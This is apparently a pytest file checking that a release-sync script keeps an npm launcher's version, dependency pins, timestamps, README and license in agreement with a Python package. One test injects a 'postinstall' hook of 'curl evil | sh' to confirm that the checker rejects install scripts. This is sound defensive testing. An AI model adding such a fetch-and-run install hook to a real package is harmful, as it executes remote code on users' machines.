"""scripts/sync_npm.py: the npm launcher's release files agree with the package (#782)."""

import importlib.util
import json
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]


def _load():
    spec = importlib.util.spec_from_file_location("sync_npm", ROOT / "scripts" / "sync_npm.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


sync_npm = _load()


@pytest.fixture
def npm_copy(tmp_path, monkeypatch):
    """A copy of npm/ (and LICENSE) that check() reads instead of the real one."""
    npm = tmp_path / "npm"
    shutil.copytree(ROOT / "npm", npm, ignore=shutil.ignore_patterns("node_modules", "test"))
    monkeypatch.setattr(sync_npm, "NPM", npm)
    monkeypatch.setattr(sync_npm, "PACKAGE_JSON", npm / "package.json")
    monkeypatch.setattr(sync_npm, "RELEASE_JSON", npm / "release.json")
    monkeypatch.setattr(sync_npm, "CONSTRAINTS", npm / "constraints.txt")
    return npm


def _edit_json(path: Path, **changes):
    data = json.loads(path.read_text())
    data.update(changes)
    path.write_text(json.dumps(data))


def test_the_committed_npm_files_are_in_sync():
    result = subprocess.run(
        [sys.executable, "scripts/sync_npm.py", "--check"],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    assert result.returncode == 0, result.stderr


def test_check_passes_on_a_copy(npm_copy):
    assert sync_npm.check() == []


def test_package_version_follows_the_python_version(npm_copy):
    from agentbreeder import __version__
    from agentbreeder._version import npm_version

    package = json.loads((npm_copy / "package.json").read_text())
    assert package["version"] == npm_version(__version__)
    _edit_json(npm_copy / "package.json", version="3.0.0")
    assert any("package.json" in error for error in sync_npm.check())


@pytest.mark.parametrize("key", ["scripts", "dependencies"])
def test_package_json_refuses_scripts_and_dependencies(npm_copy, key):
    _edit_json(npm_copy / "package.json", **{key: {"postinstall": "curl evil | sh"}})
    assert any("package.json" in error for error in sync_npm.check())


def test_release_pins_the_python_version(npm_copy):
    _edit_json(npm_copy / "release.json", pypi_version="2.7.3")
    assert any("release.json" in error for error in sync_npm.check())


def test_window_end_is_thirty_days_after_exclude_newer(npm_copy):
    release = json.loads((npm_copy / "release.json").read_text())
    _edit_json(npm_copy / "release.json", window_end=release["exclude_newer"])
    assert any("release.json" in error for error in sync_npm.check())


def test_min_uv_is_the_verified_version(npm_copy):
    _edit_json(npm_copy / "release.json", min_uv="0.4.0")
    assert any("release.json" in error for error in sync_npm.check())


def test_exclude_newer_must_be_a_utc_timestamp(npm_copy):
    _edit_json(npm_copy / "release.json", exclude_newer="yesterday")
    assert any("exclude_newer" in error for error in sync_npm.check())


def test_constraints_must_be_resolved_at_exclude_newer(npm_copy):
    release = json.loads((npm_copy / "release.json").read_text())
    path = npm_copy / "constraints.txt"
    path.write_text(path.read_text().replace(release["exclude_newer"], "2020-01-01T00:00:00Z"))
    assert any("exclude_newer" in error for error in sync_npm.check())


def test_constraints_must_be_universal(npm_copy):
    path = npm_copy / "constraints.txt"
    path.write_text(path.read_text().replace("--universal", ""))
    assert any("--universal" in error for error in sync_npm.check())


def test_constraints_must_match_exact_pins_in_pyproject(npm_copy):
    path = npm_copy / "constraints.txt"
    path.write_text(path.read_text().replace("psycopg==3.3.6", "psycopg==3.3.5"))
    assert any("psycopg" in error for error in sync_npm.check())


def test_constraints_must_satisfy_every_pyproject_range(npm_copy):
    path = npm_copy / "constraints.txt"
    text = path.read_text()
    assert "\npydantic==2." in text
    path.write_text(text.replace("\npydantic==2.", "\npydantic==1."))
    assert any("pydantic" in error for error in sync_npm.check())


def test_constraints_must_pin_every_dependency(npm_copy):
    path = npm_copy / "constraints.txt"
    lines = [line for line in path.read_text().splitlines() if not line.startswith("pyyaml==")]
    path.write_text("\n".join(lines) + "\n")
    assert any("pyyaml" in error for error in sync_npm.check())


@pytest.mark.parametrize(
    "stale", [f"agentbreeder@{sync_npm.npm_version(sync_npm.__version__)}", "uv 0.11.6"]
)
def test_readme_names_the_current_versions(npm_copy, stale):
    path = npm_copy / "README.md"
    path.write_text(path.read_text().replace(stale, "OLD"))
    assert any("README.md" in error for error in sync_npm.check())


def test_constraints_must_not_pin_agentbreeder(npm_copy):
    path = npm_copy / "constraints.txt"
    path.write_text(path.read_text() + "agentbreeder==2.7.3\n")
    assert any("agentbreeder itself" in error for error in sync_npm.check())


def test_license_must_match(npm_copy):
    (npm_copy / "LICENSE").write_text("MIT\n")
    assert any("LICENSE" in error for error in sync_npm.check())


@pytest.mark.parametrize("name", ["release.json", "README.md", "LICENSE"])
def test_missing_files_are_reported(npm_copy, name):
    (npm_copy / name).unlink()
    assert sync_npm.check()[0].startswith("cannot read")


def test_main_check_reports_errors(npm_copy, capsys):
    _edit_json(npm_copy / "release.json", pypi_version="2.7.3")
    assert sync_npm.main(["--check"]) == 1
    assert "sync_npm: npm/release.json" in capsys.readouterr().err


def test_write_sets_versions_and_window_without_network(npm_copy, monkeypatch, tmp_path):
    calls = []

    def fake_run(argv, cwd, check):
        calls.append(argv)
        out = Path(cwd) / argv[argv.index("-o") + 1]
        resolved = (ROOT / "npm" / "constraints.txt").read_text().split("\n", 2)[2]
        out.write_text(resolved)

    monkeypatch.setattr(sync_npm.subprocess, "run", fake_run)
    monkeypatch.setattr(sync_npm.shutil, "which", lambda name: f"/stub/{name}")
    # ROOT is the copy's parent, so -o (relative to ROOT) lands in the copy, never in npm/.
    monkeypatch.setattr(sync_npm, "ROOT", tmp_path)
    (tmp_path / "LICENSE").write_bytes((ROOT / "LICENSE").read_bytes())
    (tmp_path / "pyproject.toml").write_bytes((ROOT / "pyproject.toml").read_bytes())

    assert sync_npm.main(["--write", "--exclude-newer", "2026-11-10T00:00:00Z"]) == 0
    release = json.loads((npm_copy / "release.json").read_text())
    assert release["exclude_newer"] == "2026-11-10T00:00:00Z"
    assert release["window_end"] == "2026-12-10T00:00:00Z"
    assert "--exclude-newer" in calls[0] and "2026-11-10T00:00:00Z" in calls[0]
    assert "--universal" in calls[0]
    assert sync_npm.check() == []


def test_write_needs_uv(npm_copy, monkeypatch):
    monkeypatch.setattr(sync_npm.shutil, "which", lambda name: None)
    with pytest.raises(SystemExit, match="uv is required"):
        sync_npm.main(["--write", "--exclude-newer", "2026-11-10T00:00:00Z"])


def test_write_refuses_a_bad_timestamp():
    with pytest.raises(ValueError):
        sync_npm.main(["--write", "--exclude-newer", "2026-11-10"])
